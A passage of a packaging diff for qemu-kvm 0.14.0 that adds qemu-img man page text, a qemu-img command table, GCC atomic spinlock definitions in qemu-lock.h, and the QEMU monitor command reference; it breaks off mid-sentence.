+.    ds ^ \&
+.    ds , \&
+.    ds ~ ~
+.    ds /
+.\}
+.if t \{\
+.    ds ' \\k:\h'-(\\n(.wu*8/10-\*(#H)'\'\h"|\\n:u"
+.    ds ` \\k:\h'-(\\n(.wu*8/10-\*(#H)'\`\h'|\\n:u'
+.    ds ^ \\k:\h'-(\\n(.wu*10/11-\*(#H)'^\h'|\\n:u'
+.    ds , \\k:\h'-(\\n(.wu*8/10)',\h'|\\n:u'
+.    ds ~ \\k:\h'-(\\n(.wu-\*(#H-.1m)'~\h'|\\n:u'
+.    ds / \\k:\h'-(\\n(.wu*8/10-\*(#H)'\z\(sl\h'|\\n:u'
+.\}
+.    \" troff and (daisy-wheel) nroff accents
+.ds : \\k:\h'-(\\n(.wu*8/10-\*(#H+.1m+\*(#F)'\v'-\*(#V'\z.\h'.2m+\*(#F'.\h'|\\n:u'\v'\*(#V'
+.ds 8 \h'\*(#H'\(*b\h'-\*(#H'
+.ds o \\k:\h'-(\\n(.wu+\w'\(de'u-\*(#H)/2u'\v'-.3n'\*(#[\z\(de\v'.3n'\h'|\\n:u'\*(#]
+.ds d- \h'\*(#H'\(pd\h'-\w'~'u'\v'-.25m'\f2\(hy\fP\v'.25m'\h'-\*(#H'
+.ds D- D\\k:\h'-\w'D'u'\v'-.11m'\z\(hy\v'.11m'\h'|\\n:u'
+.ds th \*(#[\v'.3m'\s+1I\s-1\v'-.3m'\h'-(\w'I'u*2/3)'\s-1o\s+1\*(#]
+.ds Th \*(#[\s+2I\s-2\h'-\w'I'u*3/5'\v'-.3m'o\v'.3m'\*(#]
+.ds ae a\h'-(\w'a'u*4/10)'e
+.ds Ae A\h'-(\w'A'u*4/10)'E
+.    \" corrections for vroff
+.if v .ds ~ \\k:\h'-(\\n(.wu*9/10-\*(#H)'\s-2\u~\d\s+2\h'|\\n:u'
+.if v .ds ^ \\k:\h'-(\\n(.wu*10/11-\*(#H)'\v'-.4m'^\v'.4m'\h'|\\n:u'
+.    \" for low resolution devices (crt and lpr)
+.if \n(.H>23 .if \n(.V>19 \
+\{\
+.    ds : e
+.    ds 8 ss
+.    ds o a
+.    ds d- d\h'-1'\(ga
+.    ds D- D\h'-1'\(hy
+.    ds th \o'bp'
+.    ds Th \o'LP'
+.    ds ae ae
+.    ds Ae AE
+.\}
+.rm #[ #] #H #V #F C
+.\" ========================================================================
+.\"
+.IX Title "QEMU-IMG 1"
+.TH QEMU-IMG 1 "2013-08-03" " " " "
+.\" For nroff, turn off justification.  Always turn off hyphenation; it makes
+.\" way too many mistakes in technical documents.
+.if n .ad l
+.nh
+.SH "NAME"
+qemu\-img \- QEMU disk image utility
+.SH "SYNOPSIS"
+.IX Header "SYNOPSIS"
+usage: qemu-img command [command options]
+.SH "OPTIONS"
+.IX Header "OPTIONS"
+The following commands are supported:
+.IP "\fBcheck [\-f\fR \fIfmt\fR\fB]\fR \fIfilename\fR" 4
+.IX Item "check [-f fmt] filename"
+.PD 0
+.IP "\fBcreate [\-f\fR \fIfmt\fR\fB] [\-o\fR \fIoptions\fR\fB]\fR \fIfilename\fR \fB[\fR\fIsize\fR\fB]\fR" 4
+.IX Item "create [-f fmt] [-o options] filename [size]"
+.IP "\fBcommit [\-f\fR \fIfmt\fR\fB]\fR \fIfilename\fR" 4
+.IX Item "commit [-f fmt] filename"
+.IP "\fBconvert [\-c] [\-f\fR \fIfmt\fR\fB] [\-O\fR \fIoutput_fmt\fR\fB] [\-o\fR \fIoptions\fR\fB] [\-s\fR \fIsnapshot_name\fR\fB]\fR \fIfilename\fR \fB[\fR\fIfilename2\fR \fB[...]]\fR \fIoutput_filename\fR" 4
+.IX Item "convert [-c] [-f fmt] [-O output_fmt] [-o options] [-s snapshot_name] filename [filename2 [...]] output_filename"
+.IP "\fBinfo [\-f\fR \fIfmt\fR\fB]\fR \fIfilename\fR" 4
+.IX Item "info [-f fmt] filename"
+.IP "\fBsnapshot [\-l | \-a\fR \fIsnapshot\fR \fB| \-c\fR \fIsnapshot\fR \fB| \-d\fR \fIsnapshot\fR\fB]\fR \fIfilename\fR" 4
+.IX Item "snapshot [-l | -a snapshot | -c snapshot | -d snapshot] filename"
+.IP "\fBrebase [\-f\fR \fIfmt\fR\fB] [\-u] \-b\fR \fIbacking_file\fR \fB[\-F\fR \fIbacking_fmt\fR\fB]\fR \fIfilename\fR" 4
+.IX Item "rebase [-f fmt] [-u] -b backing_file [-F backing_fmt] filename"
+.IP "\fBresize\fR \fIfilename\fR \fB[+ | \-]\fR\fIsize\fR" 4
+.IX Item "resize filename [+ | -]size"
+.PD
+.PP
+Command parameters:
+.IP "\fIfilename\fR" 4
+.IX Item "filename"
+.Vb 1
+\& is a disk image filename
+.Ve
+.IP "\fIfmt\fR" 4
+.IX Item "fmt"
+is the disk image format. It is guessed automatically in most cases. See below
+for a description of the supported disk formats.
+.IP "\fIsize\fR" 4
+.IX Item "size"
+is the disk image size in bytes. Optional suffixes \f(CW\*(C`k\*(C'\fR or \f(CW\*(C`K\*(C'\fR
+(kilobyte, 1024) \f(CW\*(C`M\*(C'\fR (megabyte, 1024k) and \f(CW\*(C`G\*(C'\fR (gigabyte, 1024M)
+and T (terabyte, 1024G) are supported.  \f(CW\*(C`b\*(C'\fR is ignored.
+.IP "\fIoutput_filename\fR" 4
+.IX Item "output_filename"
+is the destination disk image filename
+.IP "\fIoutput_fmt\fR" 4
+.IX Item "output_fmt"
+.Vb 1
+\& is the destination format
+.Ve
+.IP "\fIoptions\fR" 4
+.IX Item "options"
+is a comma separated list of format specific options in a
+name=value format. Use \f(CW\*(C`\-o ?\*(C'\fR for an overview of the options supported
+by the used format or see the format descriptions below for details.
+.IP "\fI\-c\fR" 4
+.IX Item "-c"
+indicates that target image must be compressed (qcow format only)
+.IP "\fI\-h\fR" 4
+.IX Item "-h"
+with or without a command shows help and lists the supported formats
+.PP
+Parameters to snapshot subcommand:
+.IP "\fBsnapshot\fR" 4
+.IX Item "snapshot"
+is the name of the snapshot to create, apply or delete
+.IP "\fB\-a\fR" 4
+.IX Item "-a"
+applies a snapshot (revert disk to saved state)
+.IP "\fB\-c\fR" 4
+.IX Item "-c"
+creates a snapshot
+.IP "\fB\-d\fR" 4
+.IX Item "-d"
+deletes a snapshot
+.IP "\fB\-l\fR" 4
+.IX Item "-l"
+lists all snapshots in the given image
+.PP
+Command description:
+.IP "\fBcheck [\-f\fR \fIfmt\fR\fB]\fR \fIfilename\fR" 4
+.IX Item "check [-f fmt] filename"
+Perform a consistency check on the disk image \fIfilename\fR.
+.Sp
+Only the formats \f(CW\*(C`qcow2\*(C'\fR, \f(CW\*(C`qed\*(C'\fR and \f(CW\*(C`vdi\*(C'\fR support
+consistency checks.
+.IP "\fBcreate [\-f\fR \fIfmt\fR\fB] [\-o\fR \fIoptions\fR\fB]\fR \fIfilename\fR \fB[\fR\fIsize\fR\fB]\fR" 4
+.IX Item "create [-f fmt] [-o options] filename [size]"
+Create the new disk image \fIfilename\fR of size \fIsize\fR and format
+\&\fIfmt\fR. Depending on the file format, you can add one or more \fIoptions\fR
+that enable additional features of this format.
+.Sp
+If the option \fIbacking_file\fR is specified, then the image will record
+only the differences from \fIbacking_file\fR. No size needs to be specified in
+this case. \fIbacking_file\fR will never be modified unless you use the
+\&\f(CW\*(C`commit\*(C'\fR monitor command (or qemu-img commit).
+.Sp
+The size can also be specified using the \fIsize\fR option with \f(CW\*(C`\-o\*(C'\fR,
+it doesn't need to be specified separately in this case.
+.IP "\fBcommit [\-f\fR \fIfmt\fR\fB]\fR \fIfilename\fR" 4
+.IX Item "commit [-f fmt] filename"
+Commit the changes recorded in \fIfilename\fR in its base image.
+.IP "\fBconvert [\-c] [\-f\fR \fIfmt\fR\fB] [\-O\fR \fIoutput_fmt\fR\fB] [\-o\fR \fIoptions\fR\fB] [\-s\fR \fIsnapshot_name\fR\fB]\fR \fIfilename\fR \fB[\fR\fIfilename2\fR \fB[...]]\fR \fIoutput_filename\fR" 4
+.IX Item "convert [-c] [-f fmt] [-O output_fmt] [-o options] [-s snapshot_name] filename [filename2 [...]] output_filename"
+Convert the disk image \fIfilename\fR or a snapshot \fIsnapshot_name\fR to disk image \fIoutput_filename\fR
+using format \fIoutput_fmt\fR. It can be optionally compressed (\f(CW\*(C`\-c\*(C'\fR
+option) or use any format specific options like encryption (\f(CW\*(C`\-o\*(C'\fR option).
+.Sp
+Only the formats \f(CW\*(C`qcow\*(C'\fR and \f(CW\*(C`qcow2\*(C'\fR support compression. The
+compression is read-only. It means that if a compressed sector is
+rewritten, then it is rewritten as uncompressed data.
+.Sp
+Image conversion is also useful to get smaller image when using a
+growable format such as \f(CW\*(C`qcow\*(C'\fR or \f(CW\*(C`cow\*(C'\fR: the empty sectors
+are detected and suppressed from the destination image.
+.Sp
+You can use the \fIbacking_file\fR option to force the output image to be
+created as a copy on write image of the specified base image; the
+\&\fIbacking_file\fR should have the same content as the input's base image,
+however the path, image format, etc may differ.
+.IP "\fBinfo [\-f\fR \fIfmt\fR\fB]\fR \fIfilename\fR" 4
+.IX Item "info [-f fmt] filename"
+Give information about the disk image \fIfilename\fR. Use it in
+particular to know the size reserved on disk which can be different
+from the displayed size. If \s-1VM\s0 snapshots are stored in the disk image,
+they are displayed too.
+.IP "\fBsnapshot [\-l | \-a\fR \fIsnapshot\fR \fB| \-c\fR \fIsnapshot\fR \fB| \-d\fR \fIsnapshot\fR \fB]\fR \fIfilename\fR" 4
+.IX Item "snapshot [-l | -a snapshot | -c snapshot | -d snapshot ] filename"
+List, apply, create or delete snapshots in image \fIfilename\fR.
+.IP "\fBrebase [\-f\fR \fIfmt\fR\fB] [\-u] \-b\fR \fIbacking_file\fR \fB[\-F\fR \fIbacking_fmt\fR\fB]\fR \fIfilename\fR" 4
+.IX Item "rebase [-f fmt] [-u] -b backing_file [-F backing_fmt] filename"
+Changes the backing file of an image. Only the formats \f(CW\*(C`qcow2\*(C'\fR and
+\&\f(CW\*(C`qed\*(C'\fR support changing the backing file.
+.Sp
+The backing file is changed to \fIbacking_file\fR and (if the image format of
+\&\fIfilename\fR supports this) the backing file format is changed to
+\&\fIbacking_fmt\fR.
+.Sp
+There are two different modes in which \f(CW\*(C`rebase\*(C'\fR can operate:
+.RS 4
+.IP "\fBSafe mode\fR" 4
+.IX Item "Safe mode"
+This is the default mode and performs a real rebase operation. The new backing
+file may differ from the old one and qemu-img rebase will take care of keeping
+the guest-visible content of \fIfilename\fR unchanged.
+.Sp
+In order to achieve this, any clusters that differ between \fIbacking_file\fR
+and the old backing file of \fIfilename\fR are merged into \fIfilename\fR
+before actually changing the backing file.
+.Sp
+Note that the safe mode is an expensive operation, comparable to converting
+an image. It only works if the old backing file still exists.
+.IP "\fBUnsafe mode\fR" 4
+.IX Item "Unsafe mode"
+qemu-img uses the unsafe mode if \f(CW\*(C`\-u\*(C'\fR is specified. In this mode, only the
+backing file name and format of \fIfilename\fR is changed without any checks
+on the file contents. The user must take care of specifying the correct new
+backing file, or the guest-visible content of the image will be corrupted.
+.Sp
+This mode is useful for renaming or moving the backing file to somewhere else.
+It can be used without an accessible old backing file, i.e. you can use it to
+fix an image whose backing file has already been moved/renamed.
+.RE
+.RS 4
+.RE
+.IP "\fBresize\fR \fIfilename\fR \fB[+ | \-]\fR\fIsize\fR" 4
+.IX Item "resize filename [+ | -]size"
+Change the disk image as if it had been created with \fIsize\fR.
+.Sp
+Before using this command to shrink a disk image, you \s-1MUST\s0 use file system and
+partitioning tools inside the \s-1VM\s0 to reduce allocated file systems and partition
+sizes accordingly.  Failure to do so will result in data loss!
+.Sp
+After using this command to grow a disk image, you must use file system and
+partitioning tools inside the \s-1VM\s0 to actually begin using the new space on the
+device.
+.PP
+Supported image file formats:
+.IP "\fBraw\fR" 4
+.IX Item "raw"
+Raw disk image format (default). This format has the advantage of
+being simple and easily exportable to all other emulators. If your
+file system supports \fIholes\fR (for example in ext2 or ext3 on
+Linux or \s-1NTFS\s0 on Windows), then only the written sectors will reserve
+space. Use \f(CW\*(C`qemu\-img info\*(C'\fR to know the real size used by the
+image or \f(CW\*(C`ls \-ls\*(C'\fR on Unix/Linux.
+.IP "\fBhost_device\fR" 4
+.IX Item "host_device"
+Host device format. This format should be used instead of raw when
+converting to block devices or other devices where \*(L"holes\*(R" are not
+supported.
+.IP "\fBqcow2\fR" 4
+.IX Item "qcow2"
+\&\s-1QEMU\s0 image format, the most versatile format. Use it to have smaller
+images (useful if your filesystem does not supports holes, for example
+on Windows), optional \s-1AES\s0 encryption, zlib based compression and
+support of multiple \s-1VM\s0 snapshots.
+.Sp
+Supported options:
+.RS 4
+.ie n .IP """backing_file""" 4
+.el .IP "\f(CWbacking_file\fR" 4
+.IX Item "backing_file"
+File name of a base image (see \fBcreate\fR subcommand)
+.ie n .IP """backing_fmt""" 4
+.el .IP "\f(CWbacking_fmt\fR" 4
+.IX Item "backing_fmt"
+Image format of the base image
+.ie n .IP """encryption""" 4
+.el .IP "\f(CWencryption\fR" 4
+.IX Item "encryption"
+If this option is set to \f(CW\*(C`on\*(C'\fR, the image is encrypted.
+.Sp
+Encryption uses the \s-1AES\s0 format which is very secure (128 bit keys). Use
+a long password (16 characters) to get maximum protection.
+.ie n .IP """cluster_size""" 4
+.el .IP "\f(CWcluster_size\fR" 4
+.IX Item "cluster_size"
+Changes the qcow2 cluster size (must be between 512 and 2M). Smaller cluster
+sizes can improve the image file size whereas larger cluster sizes generally
+provide better performance.
+.ie n .IP """preallocation""" 4
+.el .IP "\f(CWpreallocation\fR" 4
+.IX Item "preallocation"
+Preallocation mode (allowed values: off, metadata). An image with preallocated
+metadata is initially larger but can improve performance when the image needs
+to grow.
+.RE
+.RS 4
+.RE
+.IP "\fBqcow\fR" 4
+.IX Item "qcow"
+Old \s-1QEMU\s0 image format. Left for compatibility.
+.Sp
+Supported options:
+.RS 4
+.ie n .IP """backing_file""" 4
+.el .IP "\f(CWbacking_file\fR" 4
+.IX Item "backing_file"
+File name of a base image (see \fBcreate\fR subcommand)
+.ie n .IP """encryption""" 4
+.el .IP "\f(CWencryption\fR" 4
+.IX Item "encryption"
+If this option is set to \f(CW\*(C`on\*(C'\fR, the image is encrypted.
+.RE
+.RS 4
+.RE
+.IP "\fBcow\fR" 4
+.IX Item "cow"
+User Mode Linux Copy On Write image format. Used to be the only growable
+image format in \s-1QEMU\s0. It is supported only for compatibility with
+previous versions. It does not work on win32.
+.IP "\fBvdi\fR" 4
+.IX Item "vdi"
+VirtualBox 1.1 compatible image format.
+.IP "\fBvmdk\fR" 4
+.IX Item "vmdk"
+VMware 3 and 4 compatible image format.
+.Sp
+Supported options:
+.RS 4
+.ie n .IP """backing_fmt""" 4
+.el .IP "\f(CWbacking_fmt\fR" 4
+.IX Item "backing_fmt"
+Image format of the base image
+.ie n .IP """compat6""" 4
+.el .IP "\f(CWcompat6\fR" 4
+.IX Item "compat6"
+Create a \s-1VMDK\s0 version 6 image (instead of version 4)
+.RE
+.RS 4
+.RE
+.IP "\fBvpc\fR" 4
+.IX Item "vpc"
+VirtualPC compatible image format (\s-1VHD\s0).
+.IP "\fBcloop\fR" 4
+.IX Item "cloop"
+Linux Compressed Loop image, useful only to reuse directly compressed
+CD-ROM images present for example in the Knoppix CD-ROMs.
+.SH "SEE ALSO"
+.IX Header "SEE ALSO"
+The \s-1HTML\s0 documentation of \s-1QEMU\s0 for more precise information and Linux
+user mode emulator invocation.
+.SH "AUTHOR"
+.IX Header "AUTHOR"
+Fabrice Bellard
diff -Nurp qemu-kvm-0.14.0+noroms.orig/qemu-img-cmds.texi qemu-kvm-0.14.0+noroms/qemu-img-cmds.texi
--- qemu-kvm-0.14.0+noroms.orig/qemu-img-cmds.texi	1969-12-31 19:00:00.000000000 -0500
+++ qemu-kvm-0.14.0+noroms/qemu-img-cmds.texi	2014-02-19 10:12:28.000000000 -0500
@@ -0,0 +1,10 @@
+@table @option
+@item check [-f @var{fmt}] @var{filename}
+@item create [-f @var{fmt}] [-o @var{options}] @var{filename} [@var{size}]
+@item commit [-f @var{fmt}] @var{filename}
+@item convert [-c] [-f @var{fmt}] [-O @var{output_fmt}] [-o @var{options}] [-s @var{snapshot_name}] @var{filename} [@var{filename2} [...]] @var{output_filename}
+@item info [-f @var{fmt}] @var{filename}
+@item snapshot [-l | -a @var{snapshot} | -c @var{snapshot} | -d @var{snapshot}] @var{filename}
+@item rebase [-f @var{fmt}] [-u] -b @var{backing_file} [-F @var{backing_fmt}] @var{filename}
+@item resize @var{filename} [+ | -]@var{size}
+@end table
diff -Nurp qemu-kvm-0.14.0+noroms.orig/qemu-lock.h qemu-kvm-0.14.0+noroms/qemu-lock.h
--- qemu-kvm-0.14.0+noroms.orig/qemu-lock.h	2014-02-21 10:59:50.018709515 -0500
+++ qemu-kvm-0.14.0+noroms/qemu-lock.h	2014-02-19 10:12:28.000000000 -0500
@@ -33,6 +33,14 @@
 
 #else
 
+#ifdef CONFIG_GCC_ATOMIC_BUILTINS
+typedef int spinlock_t;
+
+#define SPIN_LOCK_UNLOCKED 0
+
+#define resetlock(p) __sync_lock_release((p))
+#else /* CONFIG_GCC_ATOMIC_BUILTINS */
+
 #if defined(__hppa__)
 
 typedef int spinlock_t[4];
@@ -56,7 +64,11 @@ static inline void resetlock (spinlock_t
 }
 
 #endif
+#endif /* !CONFIG_GCC_ATOMIC_BUILTINS */
 
+#ifdef CONFIG_GCC_ATOMIC_BUILTINS
+#define testandset(p) __sync_lock_test_and_set((p), 1)
+#else /* CONFIG_GCC_ATOMIC_BUILTINS */
 #if defined(_ARCH_PPC)
 static inline int testandset (int *p)
 {
@@ -213,6 +225,7 @@ static inline int testandset (int *p)
 #else
 #error unimplemented CPU support
 #endif
+#endif /* !CONFIG_GCC_ATOMIC_BUILTINS */
 
 #if defined(CONFIG_USER_ONLY)
 static inline void spin_lock(spinlock_t *lock)
diff -Nurp qemu-kvm-0.14.0+noroms.orig/qemu-monitor.texi qemu-kvm-0.14.0+noroms/qemu-monitor.texi
--- qemu-kvm-0.14.0+noroms.orig/qemu-monitor.texi	1969-12-31 19:00:00.000000000 -0500
+++ qemu-kvm-0.14.0+noroms/qemu-monitor.texi	2014-02-19 10:12:23.000000000 -0500
@@ -0,0 +1,477 @@
+@table @option
+@item help or ? [@var{cmd}]
+@findex help
+Show the help for all commands or just for command @var{cmd}.
+@item commit
+@findex commit
+Commit changes to the disk images (if -snapshot is used) or backing files.
+@item q or quit
+@findex quit
+Quit the emulator.
+@item block_resize
+@findex block_resize
+Resize a block image while a guest is running.  Usually requires guest
+action to see the updated size.  Resize to a lower size is supported,
+but should be used with extreme caution.  Note that this command only
+resizes image files, it can not resize block devices like LVM volumes.
+@item eject [-f] @var{device}
+@findex eject
+Eject a removable medium (use -f to force it).
+@item drive_del @var{device}
+@findex drive_del
+Remove host block device.  The result is that guest generated IO is no longer
+submitted against the host device underlying the disk.  Once a drive has
+been deleted, the QEMU Block layer returns -EIO which results in IO
+errors in the guest for applications that are reading/writing to the device.
+@item change @var{device} @var{setting}
+@findex change
+
+Change the configuration of a device.
+
+@table @option
+@item change @var{diskdevice} @var{filename} [@var{format}]
+Change the medium for a removable disk device to point to @var{filename}. eg
+
+@example
+(qemu) change ide1-cd0 /path/to/some.iso
+@end example
+
+@var{format} is optional.
+
+@item change vnc @var{display},@var{options}
+Change the configuration of the VNC server. The valid syntax for @var{display}
+and @var{options} are described at @ref{sec_invocation}. eg
+
+@example
+(qemu) change vnc localhost:1
+@end example
+
+@item change vnc password [@var{password}]
+
+Change the password associated with the VNC server. If the new password is not
+supplied, the monitor will prompt for it to be entered. VNC passwords are only
+significant up to 8 letters. eg
+
+@example
+(qemu) change vnc password
+Password: ********
+@end example
+
+@end table
+@item screendump @var{filename}
+@findex screendump
+Save screen into PPM image @var{filename}.
+@item logfile @var{filename}
+@findex logfile
+Output logs to @var{filename}.
+@item trace-event
+@findex trace-event
+changes status of a trace event
+@item trace-file on|off|flush
+@findex trace-file
+Open, close, or flush the trace file.  If no argument is given, the status of the trace file is displayed.
+@item log @var{item1}[,...]
+@findex log
+Activate logging of the specified items to @file{/tmp/qemu.log}.
+@item savevm [@var{tag}|@var{id}]
+@findex savevm
+Create a snapshot of the whole virtual machine. If @var{tag} is
+provided, it is used as human readable identifier. If there is already
+a snapshot with the same tag or ID, it is replaced. More info at
+@ref{vm_snapshots}.
+@item loadvm @var{tag}|@var{id}
+@findex loadvm
+Set the whole virtual machine to the snapshot identified by the tag
+@var{tag} or the unique snapshot ID @var{id}.
+@item delvm @var{tag}|@var{id}
+@findex delvm
+Delete the snapshot identified by @var{tag} or @var{id}.
+@item singlestep [off]
+@findex singlestep
+Run the emulation in single step mode.
+If called with option off, the emulation returns to normal mode.
+@item stop
+@findex stop
+Stop emulation.
+@item c or cont
+@findex cont
+Resume emulation.
+@item gdbserver [@var{port}]
+@findex gdbserver
+Start gdbserver session (default @var{port}=1234)
+@item x/fmt @var{addr}
+@findex x
+Virtual memory dump starting at @var{addr}.
+@item xp /@var{fmt} @var{addr}
+@findex xp
+Physical memory dump starting at @var{addr}.
+
+@var{fmt} is a format which tells the command how to format the
+data. Its syntax is: @option{/@{count@}@{format@}@{size@}}
+
+@table @var
+@item count
+is the number of items to be dumped.
+
+@item format
+can be x (hex), d (signed decimal), u (unsigned decimal), o (octal),
+c (char) or i (asm instruction).
+
+@item size
+can be b (8 bits), h (16 bits), w (32 bits) or g (64 bits). On x86,
+@code{h} or @code{w} can be specified with the @code{i} format to
+respectively select 16 or 32 bit code instruction size.
+
+@end table
+
+Examples:
+@itemize
+@item
+Dump 10 instructions at the current instruction pointer:
+@example
+(qemu) x/10i $eip
+0x90107063:  ret
+0x90107064:  sti
+0x90107065:  lea    0x0(%esi,1),%esi
+0x90107069:  lea    0x0(%edi,1),%edi
+0x90107070:  ret
+0x90107071:  jmp    0x90107080
+0x90107073:  nop
+0x90107074:  nop
+0x90107075:  nop
+0x90107076:  nop
+@end example
+
+@item
+Dump 80 16 bit values at the start of the video memory.
+@smallexample
+(qemu) xp/80hx 0xb8000
+0x000b8000: 0x0b50 0x0b6c 0x0b65 0x0b78 0x0b38 0x0b36 0x0b2f 0x0b42
+0x000b8010: 0x0b6f 0x0b63 0x0b68 0x0b73 0x0b20 0x0b56 0x0b47 0x0b41
+0x000b8020: 0x0b42 0x0b69 0x0b6f 0x0b73 0x0b20 0x0b63 0x0b75 0x0b72
+0x000b8030: 0x0b72 0x0b65 0x0b6e 0x0b74 0x0b2d 0x0b63 0x0b76 0x0b73
+0x000b8040: 0x0b20 0x0b30 0x0b35 0x0b20 0x0b4e 0x0b6f 0x0b76 0x0b20
+0x000b8050: 0x0b32 0x0b30 0x0b30 0x0b33 0x0720 0x0720 0x0720 0x0720
+0x000b8060: 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720
+0x000b8070: 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720
+0x000b8080: 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720
+0x000b8090: 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720 0x0720
+@end smallexample
+@end itemize
+@item p or print/@var{fmt} @var{expr}
+@findex print
+
+Print expression value. Only the @var{format} part of @var{fmt} is
+used.
+Read I/O port.
+Write to I/O port.
+@item sendkey @var{keys}
+@findex sendkey
+
+Send @var{keys} to the emulator. @var{keys} could be the name of the
+key or @code{#} followed by the raw value in either decimal or hexadecimal
+format. Use @code{-} to press several keys simultaneously. Example:
+@example
+sendkey ctrl-alt-f1
+@end example
+
+This command is useful to send keys that your graphical user interface
+intercepts at low level, such as @code{ctrl-alt-f1} in X Window.
+@item system_reset
+@findex system_reset
+
+Reset the system.
+@item system_powerdown
+@findex system_powerdown
+
+Power down the system (if supported).
+@item sum @var{addr} @var{size}
+@findex sum
+
+Compute the checksum of a memory region.
+@item usb_add @var{devname}
+@findex usb_add
+
+Add the USB device @var{devname}.  For details of available devices see
+@ref{usb_devices}
+@item usb_del @var{devname}
+@findex usb_del
+
+Remove the USB device @var{devname} from the QEMU virtual USB
+hub. @var{devname} has the syntax @code{bus.addr}. Use the monitor
+command @code{info usb} to see the devices you can remove.
+@item device_add @var{config}
+@findex device_add
+
+Add device.
+@item device_del @var{id}
+@findex device_del
+
+Remove device @var{id}.
+@item cpu @var{index}
+@findex cpu
+Set the default CPU.
+@item mouse_move @var{dx} @var{dy} [@var{dz}]
+@findex mouse_move
+Move the active mouse to the specified coordinates @var{dx} @var{dy}
+with optional scroll axis @var{dz}.
+@item mouse_button @var{val}
+@findex mouse_button
+Change the active mouse button state @var{val} (1=L, 2=M, 4=R).
+@item mouse_set @var{index}
+@findex mouse_set
+Set which mouse device receives events at given @var{index}, index
+can be obtained with
+@example
+info mice
+@end example
+@item wavcapture @var{filename} [@var{frequency} [@var{bits} [@var{channels}]]]
+@findex wavcapture
+Capture audio into @var{filename}. Using sample rate @var{frequency}
+bits per sample @var{bits} and number of channels @var{channels}.
+
+Defaults:
+@itemize @minus
+@item Sample rate = 44100 Hz - CD quality
+@item Bits = 16
+@item Number of channels = 2 - Stereo
+@end itemize
+@item stopcapture @var{index}
+@findex stopcapture
+Stop capture with a given @var{index}, index can be obtained with
+@example
+info capture
+@end example
+@item memsave @var{addr} @var{size} @var{file}
+@findex memsave
+save to disk virtual memory dump starting at @var{addr} of size @var{size}.
+@item pmemsave @var{addr} @var{size} @var{file}
+@findex pmemsave
+save to disk physical memory dump starting at @var{addr} of size @var{size}.
+@item boot_set @var{bootdevicelist}
+@findex boot_set
+
+Define new values for the boot device list. Those values will override
+the values specified on the command line through the @code{-boot} option.
+
+The values that can be specified here depend on the machine type, but are
+the same that can be specified in the @code{-boot} command line option.
+@item nmi @var{cpu}
+@findex nmi
+Inject an NMI on the given CPU (x86 only).
+@item migrate [-d] [-b] [-i] @var{uri}
+@findex migrate
+Migrate to @var{uri} (using -d to not wait for completion).
+-b for migration with full copy of disk
+-i for migration with incremental copy of disk (base image is shared)
+@item migrate_cancel
+@findex migrate_cancel
+Cancel the current VM migration.
+@item migrate_set_speed @var{value}
+@findex migrate_set_speed
+Set maximum speed to @var{value} (in bytes) for migrations.
+@item migrate_set_downtime @var{second}
+@findex migrate_set_downtime
+Set maximum tolerated downtime (in seconds) for migration.
+@item client_migrate_info @var{protocol} @var{hostname} @var{port} @var{tls-port} @var{cert-subject}
+@findex client_migrate_info
+Set the spice/vnc connection info for the migration target.  The spice/vnc
+server will ask the spice/vnc client to automatically reconnect using the
+new parameters (if specified) once the vm migration finished successfully.
+@item snapshot_blkdev
+@findex snapshot_blkdev
+Snapshot device, using snapshot file as target if provided
+@item drive_add
+@findex drive_add
+Add drive to PCI storage controller.
+@item pci_add
+@findex pci_add
+Hot-add PCI device.
+@item pci_del
+@findex pci_del
+Hot remove PCI device.
+@item pcie_aer_inject_error
+@findex pcie_aer_inject_error
+Inject PCIe AER error
+@item host_net_add
+@findex host_net_add
+Add host VLAN client.
+@item host_net_remove
+@findex host_net_remove
+Remove host VLAN client.
+@item netdev_add
+@findex netdev_add
+Add host network device.
+@item netdev_del
+@findex netdev_del
+Remove host network device.
+@item hostfwd_add
+@findex hostfwd_add
+Redirect TCP or UDP connections from host to guest (requires -net user).
+@item hostfwd_remove
+@findex hostfwd_remove
+Remove host-to-guest TCP or UDP redirection.
+@item balloon @var{value}
+@findex balloon
+Request VM to change its memory allocation to @var{value} (in MB).
+@item set_link @var{name} [on|off]
+@findex set_link
+Switch link @var{name} on (i.e. up) or off (i.e. down).
+@item watchdog_action
+@findex watchdog_action
+Change watchdog action.
+@item acl_show @var{aclname}
+@findex acl_show
+List all the matching rules in the access control list, and the default
+policy. There are currently two named access control lists,
+@var{vnc.x509dname} and @var{vnc.username} matching on the x509 client
+certificate distinguished name, and SASL username respectively.
+@item acl_policy @var{aclname} @code{allow|deny}
+@findex acl_policy
+Set the default access control list policy, used in the event that
+none of the explicit rules match. The default policy at startup is
+always @code{deny}.
+@item acl_add @var{aclname} @var{match} @code{allow|deny} [@var{index}]
+@findex acl_add
+Add a match rule to the access control list, allowing or denying access.
+The match will normally be an exact username or x509 distinguished name,
+but can optionally include wildcard globs. eg @code{*@@EXAMPLE.COM} to
+allow all users in the @code{EXAMPLE.COM} kerberos realm. The match will
+normally be appended to the end of the ACL, but can be inserted
+earlier in the list if the optional @var{index} parameter is supplied.
+@item acl_remove @var{aclname} @var{match}
+@findex acl_remove
+Remove the specified match rule from the access control list.
+@item acl_reset @var{aclname}
+@findex acl_reset
+Remove all matches from the access control list, and set the default
+policy back to @code{deny}.
+@item mce @var{cpu} @var{bank} @var{status} @var{mcgstatus} @var{addr} @var{misc}
+@findex mce (x86)
+Inject an MCE on the given CPU (x86 only).
+@item getfd @var{fdname}
+@findex getfd
+If a file descriptor is passed alongside this command using the SCM_RIGHTS
+mechanism on unix sockets, it is stored using the name @var{fdname} for
+later use by other monitor commands.
+@item closefd @var{fdname}
+@findex closefd
+Close the file descriptor previously assigned to @var{fdname} using the
+@code{getfd} command. This is only needed if the file descriptor was never
+used by another monitor command.
+@item block_passwd @var{device} @var{password}
+@findex block_passwd
+Set the encrypted device @var{device} password to @var{password}
+@item cpu_set @var{cpu} [online|offline]
+Set CPU @var{cpu} online or offline.
+@item set_password [ vnc | spice ] password [ action-if-connected ]
+@findex set_password
+
+Change spice/vnc password.  Use zero to make the password stay valid
+forever.  @var{action-if-connected} specifies what should happen in
+case a connection is established: @var{fail} makes the password change
+fail.  @var{disconnect} changes the password and disconnects the
+client.  @var{keep} changes the password and keeps the connection up.
+@var{keep} is the default.
+@item expire_password [ vnc | spice ] expire-time
+@findex expire_password
+
+Specify when a password for spice/vnc becomes
